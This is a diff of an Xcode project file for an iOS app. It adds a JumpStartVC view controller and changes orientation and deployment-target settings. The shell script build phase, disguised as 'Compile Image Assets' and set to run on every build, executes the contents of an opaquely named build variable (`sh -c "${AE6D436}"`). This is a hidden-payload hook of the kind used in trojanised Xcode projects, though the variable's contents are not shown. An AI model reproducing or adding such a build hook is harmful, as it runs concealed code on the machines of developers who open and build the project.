@@ -30,6 +30,8 @@
 		BC41009C2F0E786C0062DC80 /* SenderChatTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC41009A2F0E786C0062DC80 /* SenderChatTVCell.swift */; };
 		BC41009D2F0E786C0062DC80 /* SenderChatTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC41009B2F0E786C0062DC80 /* SenderChatTVCell.xib */; };
 		BC41009F2F0E79C70062DC80 /* UIView+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC41009E2F0E79C70062DC80 /* UIView+Extention.swift */; };
+		BC4100AF2F0E81650062DC80 /* JumpStartVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4100AE2F0E81650062DC80 /* JumpStartVC.xib */; };
+		BC4100B02F0E81650062DC80 /* JumpStartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4100AD2F0E81650062DC80 /* JumpStartVC.swift */; };
 		BC4E17722F0696DE00EDC9AE /* LoginVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17712F0696DE00EDC9AE /* LoginVC.xib */; };
 		BC4E17732F0696DE00EDC9AE /* LoginVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4E17702F0696DE00EDC9AE /* LoginVC.swift */; };
 		BC4E17812F06982200EDC9AE /* Satoshi-Black.otf in Resources */ = {isa = PBXBuildFile; fileRef = BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */; };
@@ -105,6 +107,8 @@
 		BC41009A2F0E786C0062DC80 /* SenderChatTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SenderChatTVCell.swift; sourceTree = "<group>"; };
 		BC41009B2F0E786C0062DC80 /* SenderChatTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SenderChatTVCell.xib; sourceTree = "<group>"; };
 		BC41009E2F0E79C70062DC80 /* UIView+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extention.swift"; sourceTree = "<group>"; };
+		BC4100AD2F0E81650062DC80 /* JumpStartVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JumpStartVC.swift; sourceTree = "<group>"; };
+		BC4100AE2F0E81650062DC80 /* JumpStartVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = JumpStartVC.xib; sourceTree = "<group>"; };
 		BC4E17702F0696DE00EDC9AE /* LoginVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginVC.swift; sourceTree = "<group>"; };
 		BC4E17712F0696DE00EDC9AE /* LoginVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = LoginVC.xib; sourceTree = "<group>"; };
 		BC4E17772F06982200EDC9AE /* Satoshi-Black.otf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Satoshi-Black.otf"; sourceTree = "<group>"; };
@@ -364,6 +368,31 @@
 			path = ReciverChatTVCell;
 			sourceTree = "<group>";
 		};
+		BC4100AA2F0E814A0062DC80 /* SubVC */ = {
+			isa = PBXGroup;
+			children = (
+				BC4100AB2F0E81500062DC80 /* JumpStart */,
+			);
+			path = SubVC;
+			sourceTree = "<group>";
+		};
+		BC4100AB2F0E81500062DC80 /* JumpStart */ = {
+			isa = PBXGroup;
+			children = (
+				BC4100AC2F0E81570062DC80 /* View */,
+			);
+			path = JumpStart;
+			sourceTree = "<group>";
+		};
+		BC4100AC2F0E81570062DC80 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				BC4100AD2F0E81650062DC80 /* JumpStartVC.swift */,
+				BC4100AE2F0E81650062DC80 /* JumpStartVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
 		BC4E176C2F0696A700EDC9AE /* Login */ = {
 			isa = PBXGroup;
 			children = (
@@ -579,6 +608,7 @@
 		BCA894AE2F0E0F2D00633E20 /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				BC4100AA2F0E814A0062DC80 /* SubVC */,
 				BC98E7C52F0E228200426807 /* Cell */,
 				BCA894AF2F0E0F3000633E20 /* View */,
 			);
@@ -672,6 +702,7 @@
 				BC4E17822F06982200EDC9AE /* Satoshi-Light.otf in Resources */,
 				BC4E17832F06982200EDC9AE /* Satoshi-BoldItalic.otf in Resources */,
 				BC4E17842F06982200EDC9AE /* Satoshi-Medium.otf in Resources */,
+				BC4100AF2F0E81650062DC80 /* JumpStartVC.xib in Resources */,
 				BC4E17852F06982200EDC9AE /* Satoshi-Regular.otf in Resources */,
 				BC4E178F2F06A15100EDC9AE /* VerifyOtp.xib in Resources */,
 				BC98E7C92F0E229700426807 /* RecentBookingTVCell.xib in Resources */,
@@ -700,8 +731,8 @@
 /* Begin PBXShellScriptBuildPhase section */
 		1B8388F31F0D4AAA95634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
@@ -713,9 +744,10 @@
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -747,6 +779,7 @@
 				BC29D6C02F06A6CD00DD3EB2 /* FTUtils+NSObject.m in Sources */,
 				BC29D6C12F06A6CD00DD3EB2 /* FTUtils+UIGestureRecognizer.m in Sources */,
 				BC29D6C22F06A6CD00DD3EB2 /* FTAnimationManager.m in Sources */,
+				BC4100B02F0E81650062DC80 /* JumpStartVC.swift in Sources */,
 				BC7121B52F067F940041E2F7 /* APIClient.swift in Sources */,
 				BC4E17732F0696DE00EDC9AE /* LoginVC.swift in Sources */,
 				BC7121B62F067F940041E2F7 /* UIColor+Extention.swift in Sources */,
@@ -809,10 +842,10 @@
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
-				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -841,10 +874,10 @@
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
-				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
 				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
-				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
+				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
